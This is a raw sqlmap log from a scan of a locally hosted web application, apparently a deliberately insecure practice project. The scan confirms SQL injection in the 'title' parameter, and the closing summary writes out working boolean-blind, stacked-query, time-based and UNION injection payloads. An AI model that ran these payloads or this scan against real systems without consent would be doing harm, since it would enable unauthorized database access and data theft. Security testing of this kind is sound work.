#sqlmap -u http://localhost:8086/un-security/query/list?title=DEV
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:23:32 /2024-11-19/

[20:23:32] [INFO] testing connection to the target URL
[20:23:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:23:32] [INFO] testing if the target URL content is stable
[20:23:32] [INFO] target URL content is stable
[20:23:32] [INFO] testing if GET parameter 'title' is dynamic
[20:23:32] [INFO] GET parameter 'title' appears to be dynamic
[20:23:32] [WARNING] heuristic (basic) test shows that GET parameter 'title' might not be injectable
[20:23:32] [INFO] testing for SQL injection on GET parameter 'title'
[20:23:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:23:32] [INFO] GET parameter 'title' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[20:23:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:23:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:23:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:23:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:23:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:23:37] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:23:37] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:23:37] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:23:37] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:23:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:23:37] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:23:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:23:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[20:23:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:23:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[20:23:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[20:23:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[20:23:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[20:23:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[20:23:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[20:23:37] [INFO] testing 'Generic inline queries'
[20:23:37] [INFO] testing 'MySQL inline queries'
[20:23:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:23:47] [INFO] GET parameter 'title' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
[20:23:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:23:57] [INFO] GET parameter 'title' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:23:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:23:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:23:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:23:57] [INFO] target URL appears to have 3 columns in query
[20:23:57] [INFO] GET parameter 'title' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'title' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: title=DEV' AND 3483=3483 AND 'eMUu'='eMUu

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: title=DEV';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=DEV' AND (SELECT 1695 FROM (SELECT(SLEEP(5)))tvqD) AND 'eOba'='eOba

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=DEV' UNION ALL SELECT NULL,CONCAT(0x7162627071,0x6853466b596d50735a726256434d79796549446663736966746e4c4f66664743736a5141774a6864,0x717a707071),NULL-- -
---
[20:24:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[20:24:00] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 46 times
[20:24:00] [INFO] fetched data logged to text files under '**********************************'
[20:24:00] [WARNING] your sqlmap version is outdated

[*] ending @ 20:24:00 /2024-11-19/
